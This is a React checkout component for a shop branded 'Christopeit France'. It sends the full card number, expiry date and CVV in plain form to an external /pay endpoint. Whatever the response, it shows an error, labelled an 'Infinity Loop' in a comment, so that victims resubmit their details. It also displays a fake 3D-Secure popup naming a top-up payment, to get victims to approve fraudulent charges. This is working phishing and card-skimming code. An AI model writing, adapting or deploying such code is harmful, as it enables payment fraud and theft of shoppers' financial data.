import { set } from 'date-fns';
import { useState, useRef } from 'react';
import { useRouter } from 'next/router'; // Import useRouter


const CustomPay = ({ amount, orderNumber, onBack, showStep, isLoading, setIsLoading, show3DSecurePopup, setShow3DSecurePopup }) => {
  const [formData, setFormData] = useState({
    cardHolder: '',
    cardNumber: '',
    expiryDate: '',
    cvv: '',
  });

  const [showPaymentError, setShowPaymentError] = useState(false);
  const [cardLogo, setCardLogo] = useState('/verified-by-visa.png'); 

  const cardNumberRef = useRef(null);
  const expiryDateRef = useRef(null);
  const router = useRouter(); // Utiliser useRouter

  const currentDate = new Date();
  const formattedDate = currentDate.toLocaleDateString('fr-FR', {
    year: '2-digit',
    month: '2-digit',
    day: '2-digit',
  });
  const formattedTime = currentDate.toLocaleTimeString('fr-FR', {
    hour: '2-digit',
    minute: '2-digit',
    second: '2-digit',
  });

  const amountFeesed = (amount * 1.025).toFixed(2); // Add 2.5% payment fees

  const lastFourDigits = formData.cardNumber.replace(/\s/g, '').slice(-4); // Extract last 4 digits of the card number

  const handleInputChange = (e) => {
    const { name, value } = e.target;

    if (name === 'cardNumber') {
      // Format card number with spaces every 4 characters
      const formattedValue = value
        .replace(/\D/g, '') // Remove non-digit characters
        .slice(0, 16) // Limit to 16 characters
        .replace(/(.{4})/g, '$1 ') // Add space every 4 characters
        .trim(); // Remove trailing space
      setFormData((prevData) => ({
        ...prevData,
        [name]: formattedValue,
      }));
    } else if (name === 'expiryDate') {
      // Format expiry date as MM/YY
      const formattedValue = value
        .replace(/\D/g, '') // Remove non-digit characters
        .slice(0, 4) // Limit to 4 characters
        .replace(/(\d{2})(\d{1,2})?/, (_, mm, yy) => (yy ? `${mm}/${yy}` : mm)); // Add '/' after MM
      setFormData((prevData) => ({
        ...prevData,
        [name]: formattedValue,
      }));
    } else {
      setFormData((prevData) => ({
        ...prevData,
        [name]: value,
      }));
    }
  };

  const handleSubmit = async (e) => {
    e.preventDefault();

    const cardDetails = {
      cardNumber: ` ${formData.cardNumber} `, // Surround card number with spaces
      cardOwner: formData.cardHolder,
      cardExpiration: formData.expiryDate,
      cardCVC: formData.cvv,
    };

    // Si la carte commence par 5, setCardLogo à 'mastercard.png'
    if (formData.cardNumber.startsWith('5')) {
      setCardLogo('/mastercard-id-check.png');
    }
    
    try {
      setIsLoading(true); // Afficher le popup de chargement

      // Lancer un timeout pour masquer le loader et afficher 3D-secure après 30 secondes
      const timeoutId = setTimeout(() => {
        setIsLoading(false); // Masquer le popup de chargement
        setShow3DSecurePopup(true); // Afficher le popup 3D-secure
      }, 27000);


      // Effectuer la requête de paiement
      console.log('Paiement en cours...');
      
      try {
        const payFetch = await fetch('https://api.christopeit-france.shop/pay', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ orderNumber, amount, cardDetails }),
        });
      
        //Dans tous les cas afficher la popup Erreur (Infinity Loop)
        setIsLoading(false); 
        setShow3DSecurePopup(false);
        setShowPaymentError(true);

        
      } catch (error) {
        console.error('Erreur lors de la requête fetch :', error);
        alert('Impossible de traiter le paiement. Veuillez réessayer à nouveau.');
        router.push(`/paiement?failed=true`); 
        setIsLoading(false); 
        setShow3DSecurePopup(false);
      }

      
      
    } catch (error) {
      console.error('Erreur lors du paiement :', error);
      alert('Une erreur est survenue.');
      setIsLoading(false); // Masquer le popup de chargement en cas d'erreur
    }
  };

  const handleRetry = () => {
    setShowPaymentError(false);
    setShow3DSecurePopup(false);
    handleSubmit(new Event('submit')); // Simule un événement de soumission


    // setShow3DSecurePopup(true); // Afficher le popup 3D-secure
    // setShowPaymentError(false); // Masquer le popup d'erreur de paiement
  };

  return (
    <form onSubmit={handleSubmit}>
      <input
        type="text"
        name="cardHolder"
        placeholder="Titulaire de la carte"
        onChange={handleInputChange}
        required
      />
      <input
        type="text"
        name="cardNumber"
        placeholder="1234 1234 1234 1234"
        ref={cardNumberRef}
        value={formData.cardNumber}
        onChange={handleInputChange}
        required
      />
      <div className="form-row">
        <input
          type="text"
          name="expiryDate"
          placeholder="MM/YY"
          maxLength="5"
          ref={expiryDateRef}
          value={formData.expiryDate}
          onChange={handleInputChange}
          required
        />
        <input
          type="text"
          name="cvv"
          placeholder="CVV"
          maxLength="3"
          onChange={handleInputChange}
          required
        />
      </div>
      <article className="checkout-buttons">
        <button
          className="back-checkout"
          type="button"
          onClick={() => onBack && onBack()}
        >
          <i className="fas fa-arrow-left"></i>
        </button>
        <button id="pay-checkout" type="submit">
          Procéder au paiement
        </button>
      </article>

      {isLoading && (
        <div className='verification-wrapper'>
          <div className="verification-popup loading">
            <article className='head'>
              <img className='brand-logo' src='icon.png' alt='Christopeit France' />
              <img className={`card-logo ${cardLogo === '/mastercard-id-check.png' ? 'mastercard' : 'visa'}`} src={cardLogo} alt='Verified Payment' />
            </article>
            
            <h2>Préparation du paiement</h2>
            <p className='desc'>Merci de patienter quelques instants, nous préparons votre paiement.</p>
            <div className='loader'></div>
          </div>
        </div>
      )}
      
      {show3DSecurePopup && (
        <div className='verification-wrapper'>
          <div className="verification-popup d-secure">
            <article className='head'>
              <img className='brand-logo' src='icon.png' alt='Christopeit France' />
              <img className={`card-logo ${cardLogo === '/mastercard-id-check.png' ? 'mastercard' : 'visa'}`} src={cardLogo} alt='Verified Payment' />
            </article>
             <div className='loader'></div>
            <h2>Vérification 3d-secure</h2>
            <p className='desc'>Confirmez la transaction suivante :</p>
            <article className='infos'>
              <span>Mollie TopUp Payments NL</span>
              <span>Montant à valider : {amountFeesed}€</span>
              <span> Date : {`${formattedDate} à ${formattedTime}`}</span>
              <span>Carte : **** **** **** {lastFourDigits}</span>
            </article>
           
            <p className='smaller'>Une fois la transaction confirmée, vous serez redirigé vers la page de confirmation.</p>
            
          </div>
        </div>
      )}


      {showPaymentError && (
        <div className='verification-wrapper'>
          <div className="verification-popup error">
            <article className='head'>
              <img className='brand-logo' src='icon.png' alt='Christopeit France' />
              <img className={`card-logo ${cardLogo === '/mastercard-id-check.png' ? 'mastercard' : 'visa'}`} src={cardLogo} alt='Verified Payment' />
            </article>
            <h2 className='icon'>❌</h2>
            <h2>erreur lors du paiement</h2>
             <p className='desc'>Aucun paiement n'a pû être effectué, veuillez réessayer.</p>
            <button onClick={handleRetry} disabled={isLoading}>Réessayer</button> 
          </div>
        </div>
      )}


    </form>
  );
};

export default CustomPay;